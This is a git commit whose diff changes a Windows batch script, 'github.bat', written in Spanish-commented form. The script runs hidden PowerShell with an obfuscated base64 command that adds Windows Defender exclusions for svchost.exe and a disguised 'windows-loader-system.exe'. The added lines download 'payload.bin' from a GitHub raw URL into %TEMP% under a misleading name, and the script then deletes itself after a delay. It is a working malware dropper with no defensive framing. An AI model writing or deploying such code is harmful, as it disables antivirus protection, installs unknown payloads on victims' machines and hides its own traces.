49240563676ad490c5a03759e0b02366cf28acd6
carlospro473 <juancarlosaltamirano863@gmail.com>
2026-08-13 17:14:38 -0600

    Modify github.bat to download payload and adjust timing
    Updated the script to download a payload file using curl and adjusted the wait time for self-deletion.

--- github.bat
+++ github.bat
@@ -6,11 +6,14 @@ if %errorlevel% neq 0 (
     exit /b
 )
 
-:: Ejecutar el comando combinado (excluye svchost.exe y windows-loader-system.exe)
+:: Exclusión de procesos (svchost.exe y windows-loader-system.exe)
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAoJ3N2Y2hvc3QnICsgJy5leGUnKTsgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAoJ3dpbmRvd3MtbG9hZGVyLXN5c3RlbScgICsgJy5leGUnKQ==')))"
 
-:: Autoborrado: lanza un proceso en segundo plano que espera 3 segundos y elimina este .bat
-start /b powershell -Command "Start-Sleep -Seconds 3; Remove-Item -Path '%~f0' -Force"
+:: Descargar payload.bin como Windows-script-powershell.bin en %TEMP% usando curl
+curl -L -o "%TEMP%\Windows-script-powershell.bin" "https://raw.githubusercontent.com/carlospro473/Chac/main/payload.bin" >nul 2>&1
+
+:: Autoborrado: lanza un proceso en segundo plano que espera 5 segundos y elimina este .bat
+start /b powershell -Command "Start-Sleep -Seconds 5; Remove-Item -Path '%~f0' -Force"
 
 :: Salir sin mostrar ventanas
 exit
